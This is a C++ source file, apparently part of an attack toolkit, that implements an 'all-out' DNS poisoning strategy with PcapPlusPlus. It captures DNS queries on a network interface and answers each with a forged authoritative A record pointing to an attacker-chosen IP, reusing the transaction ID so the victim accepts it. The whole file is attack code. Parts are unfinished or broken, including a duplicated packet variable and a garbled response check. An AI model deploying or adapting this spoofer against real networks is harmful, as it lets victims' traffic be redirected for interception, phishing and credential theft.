#include "dns_poisoning/all_out.h"
#include "EthLayer.h"
#include "PcapFilter.h"
#include "PcapLiveDevice.h"
#include "RawPacket.h"
#include "log.h"
#include <future>
#include <stdexcept>
#include <IPv4Layer.h>
#include <DnsLayer.h>
#include <UdpLayer.h>

void ATK::DNS::AllOutDnsPoisoningStrategy::onPacketArrives(
    pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void * /*cookie*/) {
    // currently unused, no termination condition
    // auto *completionFuture = static_cast<std::promise<void> *>(cookie);

    pcpp::Packet parsedPacket(packet);
    auto *requestEthLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
    auto *requestIpLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
    auto *requestUdpLayer = parsedPacket.getLayerOfType<pcpp::UdpLayer>();
    auto *requestDnsLayer = parsedPacket.getLayerOfType<pcpp::DnsLayer>();

    if (requestEthLayer == nullptr || requestIpLayer == nullptr || requestUdpLayer == nullptr ||
        requestDnsLayer == nullptr) {
        LOG_INFO("Not a DNS packet");
        return;
    }

    // TODO determine whether or not to handle packet
    // 
    //if ((requestEthLayer->getSourceMac() == device->getMacAddress() ||
    //    requestIpLayer->getSrcIPv4Address() == device->getIPv4Address() ||
    //    requestUdpLayer.getdns
    //    ) {
    //    LOG_INFO("skipped packet");
    //    return;
    //}

    // if the packet is not a DNS request, ignore it
    if (requestDnsLayer == nullptr ||
        !requestDnsLayer->getDnsHeader()->queryOrResponse == 0)
        return;
    // try to get the query from the packet
    auto *dnsQuery = requestDnsLayer->getFirstQuery();
    if (dnsQuery == nullptr)
        return;

    // craft response packet
    pcpp::Packet responsePacket(100);

    pcpp::EthLayer ethResponse(device_->getMacAddress(),
                               requestEthLayer->getSourceMac());
    pcpp::IPv4Layer ipResponse(device_->getIPv4Address(),
                               requestIpLayer->getSrcIPv4Address());
    pcpp::UdpLayer udpResponse(53, requestUdpLayer->getSrcPort());

    pcpp::DnsLayer dnsResponse;
    dnsResponse.getDnsHeader()->transactionID = requestDnsLayer->getDnsHeader()->transactionID;
    dnsResponse.getDnsHeader()->queryOrResponse = 1; // response
    dnsResponse.getDnsHeader()->authoritativeAnswer = 1;
    dnsResponse.getDnsHeader()->recursionAvailable = 1;
    dnsResponse.getDnsHeader()->recursionDesired = requestDnsLayer->getDnsHeader()->recursionDesired;

    // TODO fill with the attacker's desired IP to reroute to
    dnsResponse.addQuery(dnsQuery); // Repeat the question
    dnsResponse.addAnswer(dnsQuery->getName(), pcpp::DNS_TYPE_A,
                              pcpp::DNS_CLASS_IN, 60, attackerIp_);

    pcpp::Packet responsePacket(DNS_PACKET_SIZE);
    responsePacket.addLayer(&ethResponse);
    responsePacket.addLayer(&ipResponse);
    responsePacket.addLayer(&udpResponse);
    responsePacket.addLayer(&dnsResponse);
    responsePacket.computeCalculateFields();

    if (!device->sendPacket(&responsePacket)) {
        device->stopCapture();
        LOG_ERROR("Failed to send packet");
        throw std::runtime_error("Failed to send packet");
    };
}

void ATK::DNS::AllOutDnsPoisoningStrategy::execute() {
    std::promise<void> completionPromise;
    std::future completionFuture = completionPromise.get_future();
    
    // TODO decide if default port is enough
    const int DNS_PORT = 53;
    
    pcpp::PortFilter dnsPortFilter(DNS_PORT, pcpp::SRC_OR_DST);
    pcpp::ProtoFilter udpFilter(pcpp::UDP);
    pcpp::AndFilter filter;
    filter.addFilter(&dnsPortFilter);
    filter.addFilter(&udpFilter);


    if (!device_->setFilter(filter)) {
        device_->close();
        LOG_ERROR("Unable to set DNS and UDP filters on interface");
        throw std::runtime_error(
            "Unable to set DNS and UDP filters on interface");
    };
    if (!device_->startCapture(
            [this](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                   void *cookie) { onPacketArrives(packet, device, cookie); },
            &completionFuture)) {
        device_->close();

        LOG_ERROR("Unable to start capturing DNS packets");
        throw std::runtime_error("Unable to start capturing DNS packets");
    };

    completionFuture.wait();

    device_->close();
}
